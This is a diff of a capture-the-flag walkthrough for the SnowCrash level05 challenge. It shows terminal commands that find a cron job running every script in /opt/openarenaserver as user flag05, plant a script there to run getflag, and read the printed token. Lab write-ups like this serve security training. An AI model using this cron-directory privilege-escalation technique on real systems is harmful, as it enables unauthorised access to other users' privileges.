@@ -1,9 +1,10 @@
-guest:
+Search from the root for any files matching user flag05 and stash stderr to /dev/null
 
 level05@SnowCrash:~$ find / -user flag05 2>/dev/null
 /usr/sbin/openarenaserver
 /rofs/usr/sbin/openarenaserver
 
+Read the file
 level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
 #!/bin/sh
 
@@ -12,38 +13,26 @@ for i in /opt/openarenaserver/* ; do
 	rm -f "$i"
 done
 
+Search from the root for any files matching name level05 and stash stderr to /dev/null
 level06@SnowCrash:~$ find / -name level05 2>/dev/null
 /var/mail/level05
 /rofs/var/mail/level05
 
+Read the file
 level06@SnowCrash:~$ cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
-level05@SnowCrash:~$ vim /opt/openarenaserver/my_script.sh
+This is the cron job which run all scripts from openarenaserver directory every two minutes and delete them 
 
+Create our own script my_script.sh in this folder
 level05@SnowCrash:~$ cat /opt/openarenaserver/my_script.sh
 #!/bin/bash
 
 getflag > /tmp/flag05
 
+provide needed rights to be run
 level05@SnowCrash:~$ chmod a+x /opt/openarenaserver/my_script.sh
 
-level05@SnowCrash:~$ ls /opt/openarenaserver/
-my_script.sh
-
-level05@SnowCrash:~$ ls /opt/openarenaserver/
-my_script.sh
-
-.
-.
-.
-
-level05@SnowCrash:~$ ls /opt/openarenaserver/
-(ничего)
-
+Read tmp/flag05 after a few minutes and get the token
 level05@SnowCrash:~$ cat /tmp/flag05
 Check flag.Here is your token : viuaaale9huek52boumoomioc
-
-level05@SnowCrash:~$ su level06
-Password:
-level06@SnowCrash:~$
